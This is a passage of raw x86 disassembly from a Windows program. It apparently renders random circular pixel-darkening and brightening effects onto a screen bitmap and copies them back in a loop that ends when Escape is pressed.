  403632:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403636:	f3 0f 2c c8          	cvttss2si %xmm0,%ecx
  40363a:	88 0c 06             	mov    %cl,(%esi,%eax,1)
  40363d:	83 c6 04             	add    $0x4,%esi
  403640:	3b 7c 24 0c          	cmp    0xc(%esp),%edi
  403644:	0f 8c e9 fc ff ff    	jl     0x403333
  40364a:	f3 0f 10 54 24 14    	movss  0x14(%esp),%xmm2
  403650:	f3 0f 10 4c 24 30    	movss  0x30(%esp),%xmm1
  403656:	8b 74 24 0c          	mov    0xc(%esp),%esi
  40365a:	8b 44 24 34          	mov    0x34(%esp),%eax
  40365e:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  403662:	8b 54 24 58          	mov    0x58(%esp),%edx
  403666:	8b 7c 24 40          	mov    0x40(%esp),%edi
  40366a:	40                   	inc    %eax
  40366b:	03 ca                	add    %edx,%ecx
  40366d:	89 44 24 34          	mov    %eax,0x34(%esp)
  403671:	89 4c 24 1c          	mov    %ecx,0x1c(%esp)
  403675:	3b c7                	cmp    %edi,%eax
  403677:	0f 8c 35 fc ff ff    	jl     0x4032b2
  40367d:	ff 15 80 61 40 00    	call   *0x406180
  403683:	99                   	cltd
  403684:	b9 78 00 00 00       	mov    $0x78,%ecx
  403689:	f7 f9                	idiv   %ecx
  40368b:	85 d2                	test   %edx,%edx
  40368d:	0f 85 ca 01 00 00    	jne    0x40385d
  403693:	ff 15 80 61 40 00    	call   *0x406180
  403699:	99                   	cltd
  40369a:	f7 fe                	idiv   %esi
  40369c:	8b 35 80 61 40 00    	mov    0x406180,%esi
  4036a2:	89 54 24 34          	mov    %edx,0x34(%esp)
  4036a6:	ff d6                	call   *%esi
  4036a8:	99                   	cltd
  4036a9:	f7 ff                	idiv   %edi
  4036ab:	8b fa                	mov    %edx,%edi
  4036ad:	89 7c 24 54          	mov    %edi,0x54(%esp)
  4036b1:	ff d6                	call   *%esi
  4036b3:	99                   	cltd
  4036b4:	b9 64 00 00 00       	mov    $0x64,%ecx
  4036b9:	f7 f9                	idiv   %ecx
  4036bb:	8d 72 32             	lea    0x32(%edx),%esi
  4036be:	8b c6                	mov    %esi,%eax
  4036c0:	89 74 24 10          	mov    %esi,0x10(%esp)
  4036c4:	f7 d8                	neg    %eax
  4036c6:	8b d0                	mov    %eax,%edx
  4036c8:	89 44 24 58          	mov    %eax,0x58(%esp)
  4036cc:	8b 44 24 0c          	mov    0xc(%esp),%eax
  4036d0:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  4036d4:	3b d6                	cmp    %esi,%edx
  4036d6:	0f 8f 7b 01 00 00    	jg     0x403857
  4036dc:	8d 0c 3a             	lea    (%edx,%edi,1),%ecx
  4036df:	0f af c8             	imul   %eax,%ecx
  4036e2:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  4036e6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%eax,%eax,1)
  4036ed:	00 00 00 
  4036f0:	8b 7c 24 58          	mov    0x58(%esp),%edi
  4036f4:	3b fe                	cmp    %esi,%edi
  4036f6:	0f 8f 48 01 00 00    	jg     0x403844
  4036fc:	8b 74 24 34          	mov    0x34(%esp),%esi
  403700:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403704:	03 f7                	add    %edi,%esi
  403706:	89 74 24 30          	mov    %esi,0x30(%esp)
  40370a:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  403710:	85 f6                	test   %esi,%esi
  403712:	0f 88 16 01 00 00    	js     0x40382e
  403718:	3b f0                	cmp    %eax,%esi
  40371a:	0f 8d 0e 01 00 00    	jge    0x40382e
  403720:	8b 44 24 54          	mov    0x54(%esp),%eax
  403724:	03 c2                	add    %edx,%eax
  403726:	0f 88 fe 00 00 00    	js     0x40382a
  40372c:	3b 44 24 40          	cmp    0x40(%esp),%eax
  403730:	0f 8d f4 00 00 00    	jge    0x40382a
  403736:	8b c2                	mov    %edx,%eax
  403738:	8b cf                	mov    %edi,%ecx
  40373a:	0f af cf             	imul   %edi,%ecx
  40373d:	0f af c2             	imul   %edx,%eax
  403740:	03 c8                	add    %eax,%ecx
  403742:	66 0f 6e c1          	movd   %ecx,%xmm0
  403746:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  403749:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  40374c:	e8 f1 25 00 00       	call   0x405d42
  403751:	0f 57 c9             	xorps  %xmm1,%xmm1
  403754:	f2 0f 5a c8          	cvtsd2ss %xmm0,%xmm1
  403758:	66 0f 6e 44 24 10    	movd   0x10(%esp),%xmm0
  40375e:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  403761:	f3 0f 5e c8          	divss  %xmm0,%xmm1
  403765:	f3 0f 10 05 c4 63 40 	movss  0x4063c4,%xmm0
  40376c:	00 
  40376d:	0f 2f c1             	comiss %xmm1,%xmm0
  403770:	f3 0f 11 4c 24 50    	movss  %xmm1,0x50(%esp)
  403776:	0f 82 a6 00 00 00    	jb     0x403822
  40377c:	f3 0f 10 44 24 14    	movss  0x14(%esp),%xmm0
  403782:	f3 0f 59 05 44 64 40 	mulss  0x406444,%xmm0
  403789:	00 
  40378a:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  40378d:	e8 aa 25 00 00       	call   0x405d3c
  403792:	0f 57 c9             	xorps  %xmm1,%xmm1
  403795:	8b 74 24 20          	mov    0x20(%esp),%esi
  403799:	f2 0f 5a c8          	cvtsd2ss %xmm0,%xmm1
  40379d:	03 f7                	add    %edi,%esi
  40379f:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  4037a3:	03 74 24 34          	add    0x34(%esp),%esi
  4037a7:	f3 0f 10 05 c4 63 40 	movss  0x4063c4,%xmm0
  4037ae:	00 
  4037af:	f3 0f 5c 44 24 50    	subss  0x50(%esp),%xmm0
  4037b5:	f3 0f 59 c8          	mulss  %xmm0,%xmm1
  4037b9:	f3 0f 59 0d b0 63 40 	mulss  0x4063b0,%xmm1
  4037c0:	00 
  4037c1:	f3 0f 58 0d b0 63 40 	addss  0x4063b0,%xmm1
  4037c8:	00 
  4037c9:	0f 28 c1             	movaps %xmm1,%xmm0
  4037cc:	f3 0f 59 0d 58 64 40 	mulss  0x406458,%xmm1
  4037d3:	00 
  4037d4:	f3 0f 59 05 5c 64 40 	mulss  0x40645c,%xmm0
  4037db:	00 
  4037dc:	f3 0f 2c c0          	cvttss2si %xmm0,%eax
  4037e0:	0f b6 c8             	movzbl %al,%ecx
  4037e3:	0f b6 44 b2 02       	movzbl 0x2(%edx,%esi,4),%eax
  4037e8:	03 c1                	add    %ecx,%eax
  4037ea:	b9 ff 00 00 00       	mov    $0xff,%ecx
  4037ef:	3d ff 00 00 00       	cmp    $0xff,%eax
  4037f4:	0f 47 c1             	cmova  %ecx,%eax
  4037f7:	88 44 b2 02          	mov    %al,0x2(%edx,%esi,4)
  4037fb:	8b 54 24 2c          	mov    0x2c(%esp),%edx
  4037ff:	f3 0f 2c c1          	cvttss2si %xmm1,%eax
  403803:	0f b6 c8             	movzbl %al,%ecx
  403806:	0f b6 44 b2 01       	movzbl 0x1(%edx,%esi,4),%eax
  40380b:	03 c1                	add    %ecx,%eax
  40380d:	b9 ff 00 00 00       	mov    $0xff,%ecx
  403812:	3d ff 00 00 00       	cmp    $0xff,%eax
  403817:	0f 47 c1             	cmova  %ecx,%eax
  40381a:	88 44 b2 01          	mov    %al,0x1(%edx,%esi,4)
  40381e:	8b 74 24 30          	mov    0x30(%esp),%esi
  403822:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403826:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  40382a:	8b 44 24 0c          	mov    0xc(%esp),%eax
  40382e:	47                   	inc    %edi
  40382f:	46                   	inc    %esi
  403830:	89 74 24 30          	mov    %esi,0x30(%esp)
  403834:	3b f9                	cmp    %ecx,%edi
  403836:	0f 8e d4 fe ff ff    	jle    0x403710
  40383c:	8b 74 24 10          	mov    0x10(%esp),%esi
  403840:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403844:	42                   	inc    %edx
  403845:	03 c8                	add    %eax,%ecx
  403847:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  40384b:	89 4c 24 20          	mov    %ecx,0x20(%esp)
  40384f:	3b d6                	cmp    %esi,%edx
  403851:	0f 8e 99 fe ff ff    	jle    0x4036f0
  403857:	8b 7c 24 40          	mov    0x40(%esp),%edi
  40385b:	eb 04                	jmp    0x403861
  40385d:	8b 44 24 0c          	mov    0xc(%esp),%eax
  403861:	8b 74 24 6c          	mov    0x6c(%esp),%esi
  403865:	68 20 00 cc 00       	push   $0xcc0020
  40386a:	6a 00                	push   $0x0
  40386c:	6a 00                	push   $0x0
  40386e:	56                   	push   %esi
  40386f:	57                   	push   %edi
  403870:	50                   	push   %eax
  403871:	6a 00                	push   $0x0
  403873:	6a 00                	push   $0x0
  403875:	ff 74 24 64          	push   0x64(%esp)
  403879:	ff 15 20 60 40 00    	call   *0x406020
  40387f:	56                   	push   %esi
  403880:	ff 15 10 60 40 00    	call   *0x406010
  403886:	6a 10                	push   $0x10
  403888:	ff 15 64 60 40 00    	call   *0x406064
  40388e:	6a 1b                	push   $0x1b
  403890:	ff 15 c8 60 40 00    	call   *0x4060c8
  403896:	8b 74 24 0c          	mov    0xc(%esp),%esi
  40389a:	66 85 c0             	test   %ax,%ax
  40389d:	0f 84 7f f9 ff ff    	je     0x403222
  4038a3:	ff 74 24 5c          	push   0x5c(%esp)
  4038a7:	ff 15 18 60 40 00    	call   *0x406018
  4038ad:	ff 74 24 44          	push   0x44(%esp)
  4038b1:	6a 00                	push   $0x0
  4038b3:	ff 15 b0 60 40 00    	call   *0x4060b0
  4038b9:	8b 8c 24 9c 00 00 00 	mov    0x9c(%esp),%ecx
  4038c0:	33 c0                	xor    %eax,%eax
  4038c2:	5f                   	pop    %edi
  4038c3:	5e                   	pop    %esi
  4038c4:	33 cc                	xor    %esp,%ecx
  4038c6:	e8 f9 15 00 00       	call   0x404ec4
  4038cb:	8b e5                	mov    %ebp,%esp
  4038cd:	5d                   	pop    %ebp
  4038ce:	c2 04 00             	ret    $0x4
  4038d1:	cc                   	int3
  4038d2:	cc                   	int3
  4038d3:	cc                   	int3
  4038d4:	cc                   	int3
  4038d5:	cc                   	int3
  4038d6:	cc                   	int3
  4038d7:	cc                   	int3
  4038d8:	cc                   	int3
  4038d9:	cc                   	int3
  4038da:	cc                   	int3
  4038db:	cc                   	int3
  4038dc:	cc                   	int3
  4038dd:	cc                   	int3
  4038de:	cc                   	int3
  4038df:	cc                   	int3
  4038e0:	55                   	push   %ebp
  4038e1:	8b ec                	mov    %esp,%ebp
  4038e3:	83 e4 f8             	and    $0xfffffff8,%esp
  4038e6:	83 ec 6c             	sub    $0x6c,%esp
  4038e9:	a1 08 80 40 00       	mov    0x408008,%eax
  4038ee:	33 c4                	xor    %esp,%eax
  4038f0:	89 44 24 68          	mov    %eax,0x68(%esp)
  4038f4:	53                   	push   %ebx
  4038f5:	56                   	push   %esi
  4038f6:	57                   	push   %edi
  4038f7:	6a 00                	push   $0x0
  4038f9:	ff 15 b8 60 40 00    	call   *0x4060b8
  4038ff:	8b 35 c0 60 40 00    	mov    0x4060c0,%esi
  403905:	8b f8                	mov    %eax,%edi
  403907:	6a 00                	push   $0x0
  403909:	89 7c 24 34          	mov    %edi,0x34(%esp)
  40390d:	ff d6                	call   *%esi
  40390f:	6a 01                	push   $0x1
  403911:	89 44 24 24          	mov    %eax,0x24(%esp)
  403915:	ff d6                	call   *%esi
  403917:	8b 74 24 20          	mov    0x20(%esp),%esi
  40391b:	8b d8                	mov    %eax,%ebx
  40391d:	6a 00                	push   $0x0
  40391f:	6a 00                	push   $0x0
  403921:	8d 44 24 18          	lea    0x18(%esp),%eax
  403925:	89 5c 24 20          	mov    %ebx,0x20(%esp)
  403929:	50                   	push   %eax
  40392a:	6a 00                	push   $0x0
  40392c:	8d 44 24 58          	lea    0x58(%esp),%eax
  403930:	c7 44 24 58 28 00 00 	movl   $0x28,0x58(%esp)
  403937:	00 
  403938:	0f 57 c0             	xorps  %xmm0,%xmm0
  40393b:	89 74 24 5c          	mov    %esi,0x5c(%esp)
  40393f:	50                   	push   %eax
  403940:	57                   	push   %edi
  403941:	89 5c 24 68          	mov    %ebx,0x68(%esp)
  403945:	c7 44 24 6c 01 00 20 	movl   $0x200001,0x6c(%esp)
  40394c:	00 
  40394d:	c7 44 24 70 00 00 00 	movl   $0x0,0x70(%esp)
  403954:	00 
  403955:	0f 11 44 24 74       	movups %xmm0,0x74(%esp)
  40395a:	66 0f d6 84 24 84 00 	movq   %xmm0,0x84(%esp)
  403961:	00 00 
  403963:	ff 15 04 60 40 00    	call   *0x406004
  403969:	6a 1b                	push   $0x1b
  40396b:	89 44 24 40          	mov    %eax,0x40(%esp)
  40396f:	ff 15 c8 60 40 00    	call   *0x4060c8
  403975:	66 85 c0             	test   %ax,%ax
  403978:	0f 85 c3 03 00 00    	jne    0x403d41
  40397e:	8b 3d 80 61 40 00    	mov    0x406180,%edi
  403984:	8b c3                	mov    %ebx,%eax
  403986:	0f af c6             	imul   %esi,%eax
  403989:	89 44 24 34          	mov    %eax,0x34(%esp)
  40398d:	0f 1f 00             	nopl   (%eax)
  403990:	ff 74 24 30          	push   0x30(%esp)
  403994:	ff 15 08 60 40 00    	call   *0x406008
  40399a:	ff 74 24 3c          	push   0x3c(%esp)
  40399e:	89 44 24 3c          	mov    %eax,0x3c(%esp)
  4039a2:	50                   	push   %eax
  4039a3:	ff 15 00 60 40 00    	call   *0x406000
  4039a9:	33 d2                	xor    %edx,%edx
  4039ab:	39 54 24 34          	cmp    %edx,0x34(%esp)
  4039af:	7e 6d                	jle    0x403a1e
  4039b1:	8b 5c 24 34          	mov    0x34(%esp),%ebx
  4039b5:	66 66 66 0f 1f 84 00 	data16 data16 nopw 0x0(%eax,%eax,1)
  4039bc:	00 00 00 00 
  4039c0:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4039c4:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  4039cb:	00 
  4039cc:	0f b6 44 91 02       	movzbl 0x2(%ecx,%edx,4),%eax
  4039d1:	83 c0 fb             	add    $0xfffffffb,%eax
  4039d4:	0f 48 44 24 0c       	cmovs  0xc(%esp),%eax
  4039d9:	88 44 91 02          	mov    %al,0x2(%ecx,%edx,4)
  4039dd:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4039e1:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  4039e8:	00 
  4039e9:	0f b6 44 91 01       	movzbl 0x1(%ecx,%edx,4),%eax
  4039ee:	83 c0 fb             	add    $0xfffffffb,%eax
  4039f1:	0f 48 44 24 0c       	cmovs  0xc(%esp),%eax
  4039f6:	88 44 91 01          	mov    %al,0x1(%ecx,%edx,4)
  4039fa:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  4039fe:	c7 44 24 0c 00 00 00 	movl   $0x0,0xc(%esp)
  403a05:	00 
  403a06:	0f b6 04 91          	movzbl (%ecx,%edx,4),%eax
  403a0a:	83 c0 fb             	add    $0xfffffffb,%eax
  403a0d:	0f 48 44 24 0c       	cmovs  0xc(%esp),%eax
  403a12:	88 04 91             	mov    %al,(%ecx,%edx,4)
  403a15:	42                   	inc    %edx
  403a16:	3b d3                	cmp    %ebx,%edx
  403a18:	7c a6                	jl     0x4039c0
  403a1a:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  403a1e:	c7 44 24 0c 64 00 00 	movl   $0x64,0xc(%esp)
  403a25:	00 
  403a26:	eb 04                	jmp    0x403a2c
  403a28:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  403a2c:	ff d7                	call   *%edi
  403a2e:	99                   	cltd
  403a2f:	f7 fe                	idiv   %esi
  403a31:	89 54 24 24          	mov    %edx,0x24(%esp)
  403a35:	ff d7                	call   *%edi
  403a37:	99                   	cltd
  403a38:	f7 fb                	idiv   %ebx
  403a3a:	89 54 24 28          	mov    %edx,0x28(%esp)
  403a3e:	ff d7                	call   *%edi
  403a40:	99                   	cltd
  403a41:	b9 03 00 00 00       	mov    $0x3,%ecx
  403a46:	f7 f9                	idiv   %ecx
  403a48:	8d 7a 01             	lea    0x1(%edx),%edi
  403a4b:	8b c7                	mov    %edi,%eax
  403a4d:	89 7c 24 14          	mov    %edi,0x14(%esp)
  403a51:	f7 d8                	neg    %eax
  403a53:	8b d8                	mov    %eax,%ebx
  403a55:	89 44 24 2c          	mov    %eax,0x2c(%esp)
  403a59:	3b df                	cmp    %edi,%ebx
  403a5b:	0f 8f f5 00 00 00    	jg     0x403b56
  403a61:	8b 54 24 28          	mov    0x28(%esp),%edx
  403a65:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403a69:	03 d3                	add    %ebx,%edx
  403a6b:	0f af d1             	imul   %ecx,%edx
  403a6e:	03 54 24 24          	add    0x24(%esp),%edx
  403a72:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  403a76:	8b f0                	mov    %eax,%esi
  403a78:	3b f7                	cmp    %edi,%esi
  403a7a:	0f 8f c3 00 00 00    	jg     0x403b43
  403a80:	8b 7c 24 24          	mov    0x24(%esp),%edi
  403a84:	8b 44 24 14          	mov    0x14(%esp),%eax
  403a88:	03 fe                	add    %esi,%edi
  403a8a:	66 0f 1f 44 00 00    	nopw   0x0(%eax,%eax,1)
  403a90:	85 ff                	test   %edi,%edi
  403a92:	0f 88 95 00 00 00    	js     0x403b2d
  403a98:	3b f9                	cmp    %ecx,%edi
  403a9a:	0f 8d 8d 00 00 00    	jge    0x403b2d
  403aa0:	8b 44 24 28          	mov    0x28(%esp),%eax
  403aa4:	03 c3                	add    %ebx,%eax
  403aa6:	0f 88 26 02 00 00    	js     0x403cd2
  403aac:	3b 44 24 18          	cmp    0x18(%esp),%eax
  403ab0:	0f 8d 1c 02 00 00    	jge    0x403cd2
  403ab6:	8b ce                	mov    %esi,%ecx
  403ab8:	8b c3                	mov    %ebx,%eax
  403aba:	0f af ce             	imul   %esi,%ecx
  403abd:	0f af c3             	imul   %ebx,%eax
  403ac0:	03 c8                	add    %eax,%ecx
  403ac2:	66 0f 6e c1          	movd   %ecx,%xmm0
  403ac6:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  403ac9:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  403acc:	e8 71 22 00 00       	call   0x405d42
  403ad1:	8b 44 24 14          	mov    0x14(%esp),%eax
  403ad5:	0f 57 c9             	xorps  %xmm1,%xmm1
  403ad8:	f2 0f 5a c8          	cvtsd2ss %xmm0,%xmm1
  403adc:	66 0f 6e c0          	movd   %eax,%xmm0
  403ae0:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  403ae3:	f3 0f 5e c8          	divss  %xmm0,%xmm1
  403ae7:	f3 0f 10 05 c4 63 40 	movss  0x4063c4,%xmm0
  403aee:	00 
  403aef:	0f 2f c1             	comiss %xmm1,%xmm0
  403af2:	72 35                	jb     0x403b29
  403af4:	ff 15 80 61 40 00    	call   *0x406180
  403afa:	99                   	cltd
  403afb:	b9 37 00 00 00       	mov    $0x37,%ecx
  403b00:	f7 f9                	idiv   %ecx
  403b02:	8b 44 24 10          	mov    0x10(%esp),%eax
  403b06:	8b 4c 24 1c          	mov    0x1c(%esp),%ecx
  403b0a:	81 c2 c8 00 00 00    	add    $0xc8,%edx
  403b10:	03 ce                	add    %esi,%ecx
  403b12:	88 54 88 02          	mov    %dl,0x2(%eax,%ecx,4)
  403b16:	8b 44 24 10          	mov    0x10(%esp),%eax
  403b1a:	88 54 88 01          	mov    %dl,0x1(%eax,%ecx,4)
  403b1e:	8b 44 24 10          	mov    0x10(%esp),%eax
  403b22:	88 14 88             	mov    %dl,(%eax,%ecx,4)
  403b25:	8b 44 24 14          	mov    0x14(%esp),%eax
  403b29:	8b 4c 24 20          	mov    0x20(%esp),%ecx
  403b2d:	46                   	inc    %esi
  403b2e:	47                   	inc    %edi
  403b2f:	3b f0                	cmp    %eax,%esi
  403b31:	0f 8e 59 ff ff ff    	jle    0x403a90
  403b37:	8b 7c 24 14          	mov    0x14(%esp),%edi
  403b3b:	8b 54 24 1c          	mov    0x1c(%esp),%edx
  403b3f:	8b 44 24 2c          	mov    0x2c(%esp),%eax
  403b43:	43                   	inc    %ebx
  403b44:	03 d1                	add    %ecx,%edx
  403b46:	89 54 24 1c          	mov    %edx,0x1c(%esp)
  403b4a:	3b df                	cmp    %edi,%ebx
  403b4c:	0f 8e 24 ff ff ff    	jle    0x403a76
  403b52:	8b 74 24 20          	mov    0x20(%esp),%esi
  403b56:	83 6c 24 0c 01       	subl   $0x1,0xc(%esp)
  403b5b:	8b 3d 80 61 40 00    	mov    0x406180,%edi
  403b61:	0f 85 c1 fe ff ff    	jne    0x403a28
  403b67:	ff d7                	call   *%edi
  403b69:	99                   	cltd
  403b6a:	b9 3c 00 00 00       	mov    $0x3c,%ecx
  403b6f:	f7 f9                	idiv   %ecx
  403b71:	85 d2                	test   %edx,%edx
  403b73:	0f 85 80 01 00 00    	jne    0x403cf9
  403b79:	ff d7                	call   *%edi
  403b7b:	99                   	cltd
  403b7c:	f7 fe                	idiv   %esi
  403b7e:	8b fa                	mov    %edx,%edi
  403b80:	89 7c 24 24          	mov    %edi,0x24(%esp)
  403b84:	ff 15 80 61 40 00    	call   *0x406180
  403b8a:	99                   	cltd
  403b8b:	33 c9                	xor    %ecx,%ecx
  403b8d:	f7 7c 24 18          	idivl  0x18(%esp)
  403b91:	8d 42 e2             	lea    -0x1e(%edx),%eax
  403b94:	85 c0                	test   %eax,%eax
  403b96:	0f 49 c8             	cmovns %eax,%ecx
  403b99:	8d 42 1e             	lea    0x1e(%edx),%eax
  403b9c:	89 44 24 14          	mov    %eax,0x14(%esp)
  403ba0:	8b d9                	mov    %ecx,%ebx
  403ba2:	8b c1                	mov    %ecx,%eax
  403ba4:	2b c2                	sub    %edx,%eax
  403ba6:	0f af de             	imul   %esi,%ebx
  403ba9:	89 44 24 1c          	mov    %eax,0x1c(%esp)
  403bad:	8b 54 24 14          	mov    0x14(%esp),%edx
  403bb1:	8b c2                	mov    %edx,%eax
  403bb3:	39 54 24 18          	cmp    %edx,0x18(%esp)
  403bb7:	89 5c 24 28          	mov    %ebx,0x28(%esp)
  403bbb:	0f 4c 44 24 18       	cmovl  0x18(%esp),%eax
  403bc0:	89 4c 24 2c          	mov    %ecx,0x2c(%esp)
  403bc4:	3b c8                	cmp    %eax,%ecx
  403bc6:	0f 8d 27 01 00 00    	jge    0x403cf3
  403bcc:	8d 47 e2             	lea    -0x1e(%edi),%eax
  403bcf:	33 ff                	xor    %edi,%edi
  403bd1:	85 c0                	test   %eax,%eax
  403bd3:	0f 49 f8             	cmovns %eax,%edi
  403bd6:	8b 44 24 24          	mov    0x24(%esp),%eax
  403bda:	8b cf                	mov    %edi,%ecx
  403bdc:	03 df                	add    %edi,%ebx
  403bde:	2b c8                	sub    %eax,%ecx
  403be0:	c1 e3 02             	shl    $0x2,%ebx
  403be3:	8d 50 1e             	lea    0x1e(%eax),%edx
  403be6:	89 54 24 44          	mov    %edx,0x44(%esp)
  403bea:	3b f2                	cmp    %edx,%esi
  403bec:	89 4c 24 0c          	mov    %ecx,0xc(%esp)
  403bf0:	8b c2                	mov    %edx,%eax
  403bf2:	0f 4c c6             	cmovl  %esi,%eax
  403bf5:	3b f8                	cmp    %eax,%edi
  403bf7:	0f 8d de 00 00 00    	jge    0x403cdb
  403bfd:	f2 0f 10 0d 10 64 40 	movsd  0x406410,%xmm1
  403c04:	00 
  403c05:	66 0f 6e c1          	movd   %ecx,%xmm0
  403c09:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  403c0c:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  403c0f:	e8 22 21 00 00       	call   0x405d36
  403c14:	f2 0f 10 0d 10 64 40 	movsd  0x406410,%xmm1
  403c1b:	00 
  403c1c:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  403c20:	f3 0f 11 44 24 40    	movss  %xmm0,0x40(%esp)
  403c26:	66 0f 6e 44 24 1c    	movd   0x1c(%esp),%xmm0
  403c2c:	0f 5b c0             	cvtdq2ps %xmm0,%xmm0
  403c2f:	0f 5a c0             	cvtps2pd %xmm0,%xmm0
  403c32:	e8 ff 20 00 00       	call   0x405d36
  403c37:	f3 0f 10 4c 24 40    	movss  0x40(%esp),%xmm1
  403c3d:	f2 0f 5a c0          	cvtsd2ss %xmm0,%xmm0
  403c41:	f3 0f 58 c8          	addss  %xmm0,%xmm1
  403c45:	0f 5a c1             	cvtps2pd %xmm1,%xmm0
  403c48:	e8 f5 20 00 00       	call   0x405d42
  403c4d:	0f 57 c9             	xorps  %xmm1,%xmm1
  403c50:	f2 0f 5a c8          	cvtsd2ss %xmm0,%xmm1
  403c54:	f3 0f 10 05 c4 63 40 	movss  0x4063c4,%xmm0
  403c5b:	00 
  403c5c:	f3 0f 5e 0d 50 64 40 	divss  0x406450,%xmm1
  403c63:	00 
  403c64:	0f 2f c1             	comiss %xmm1,%xmm0
  403c67:	76 57                	jbe    0x403cc0
  403c69:	8b 4c 24 10          	mov    0x10(%esp),%ecx
  403c6d:	f3 0f 5c c1          	subss  %xmm1,%xmm0
  403c71:	ba ff 00 00 00       	mov    $0xff,%edx
  403c76:	0f b6 44 0b 02       	movzbl 0x2(%ebx,%ecx,1),%eax
  403c7b:	f3 0f 59 05 60 64 40 	mulss  0x406460,%xmm0
  403c82:	00 
  403c83:	f3 0f 2c f0          	cvttss2si %xmm0,%esi
  403c87:	03 c6                	add    %esi,%eax
  403c89:	3d ff 00 00 00       	cmp    $0xff,%eax
  403c8e:	0f 4f c2             	cmovg  %edx,%eax
  403c91:	88 44 0b 02          	mov    %al,0x2(%ebx,%ecx,1)
  403c95:	8b 54 24 10          	mov    0x10(%esp),%edx
  403c99:	8b ce                	mov    %esi,%ecx
  403c9b:	85 c9                	test   %ecx,%ecx
  403c9d:	79 03                	jns    0x403ca2
  403c9f:	83 c1 01             	add    $0x1,%ecx
  403ca2:	d1 f9                	sar    $1,%ecx
  403ca4:	0f b6 44 13 01       	movzbl 0x1(%ebx,%edx,1),%eax
  403ca9:	8b 74 24 20          	mov    0x20(%esp),%esi
  403cad:	03 c1                	add    %ecx,%eax
  403caf:	3d ff 00 00 00       	cmp    $0xff,%eax
  403cb4:	b9 ff 00 00 00       	mov    $0xff,%ecx
  403cb9:	0f 4f c1             	cmovg  %ecx,%eax
  403cbc:	88 44 13 01          	mov    %al,0x1(%ebx,%edx,1)
  403cc0:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  403cc4:	47                   	inc    %edi
  403cc5:	8b 54 24 44          	mov    0x44(%esp),%edx
  403cc9:	83 c3 04             	add    $0x4,%ebx
  403ccc:	41                   	inc    %ecx
  403ccd:	e9 18 ff ff ff       	jmp    0x403bea
  403cd2:	8b 44 24 14          	mov    0x14(%esp),%eax
  403cd6:	e9 52 fe ff ff       	jmp    0x403b2d
  403cdb:	8b 4c 24 2c          	mov    0x2c(%esp),%ecx
  403cdf:	8b 5c 24 28          	mov    0x28(%esp),%ebx
  403ce3:	41                   	inc    %ecx
  403ce4:	8b 7c 24 24          	mov    0x24(%esp),%edi
  403ce8:	03 de                	add    %esi,%ebx
  403cea:	ff 44 24 1c          	incl   0x1c(%esp)
  403cee:	e9 ba fe ff ff       	jmp    0x403bad
  403cf3:	8b 3d 80 61 40 00    	mov    0x406180,%edi
  403cf9:	8b 5c 24 18          	mov    0x18(%esp),%ebx
  403cfd:	68 20 00 cc 00       	push   $0xcc0020
  403d02:	6a 00                	push   $0x0
  403d04:	6a 00                	push   $0x0
  403d06:	ff 74 24 44          	push   0x44(%esp)
  403d0a:	53                   	push   %ebx
  403d0b:	56                   	push   %esi
  403d0c:	6a 00                	push   $0x0
  403d0e:	6a 00                	push   $0x0
  403d10:	ff 74 24 50          	push   0x50(%esp)
  403d14:	ff 15 20 60 40 00    	call   *0x406020
  403d1a:	ff 74 24 38          	push   0x38(%esp)
  403d1e:	ff 15 10 60 40 00    	call   *0x406010
  403d24:	6a 1e                	push   $0x1e
  403d26:	ff 15 64 60 40 00    	call   *0x406064
  403d2c:	6a 1b                	push   $0x1b
  403d2e:	ff 15 c8 60 40 00    	call   *0x4060c8
  403d34:	66 85 c0             	test   %ax,%ax
  403d37:	0f 84 53 fc ff ff    	je     0x403990
  403d3d:	8b 7c 24 30          	mov    0x30(%esp),%edi
  403d41:	ff 74 24 3c          	push   0x3c(%esp)
  403d45:	ff 15 18 60 40 00    	call   *0x406018
  403d4b:	57                   	push   %edi
  403d4c:	6a 00                	push   $0x0
  403d4e:	ff 15 b0 60 40 00    	call   *0x4060b0
  403d54:	8b 4c 24 74          	mov    0x74(%esp),%ecx
  403d58:	33 c0                	xor    %eax,%eax
  403d5a:	5f                   	pop    %edi
  403d5b:	5e                   	pop    %esi
  403d5c:	5b                   	pop    %ebx
  403d5d:	33 cc                	xor    %esp,%ecx
  403d5f:	e8 60 11 00 00       	call   0x404ec4
  403d64:	8b e5                	mov    %ebp,%esp
  403d66:	5d                   	pop    %ebp
  403d67:	c2 04 00             	ret    $0x4
  403d6a:	cc                   	int3
  403d6b:	cc                   	int3
  403d6c:	cc                   	int3
  403d6d:	cc                   	int3
  403d6e:	cc                   	int3
  403d6f:	cc                   	int3
  403d70:	55                   	push   %ebp
  403d71:	8b ec                	mov    %esp,%ebp
  403d73:	83 e4 f8             	and    $0xfffffff8,%esp
  403d76:	b8 48 71 02 00       	mov    $0x27148,%eax
  403d7b:	e8 70 1f 00 00       	call   0x405cf0
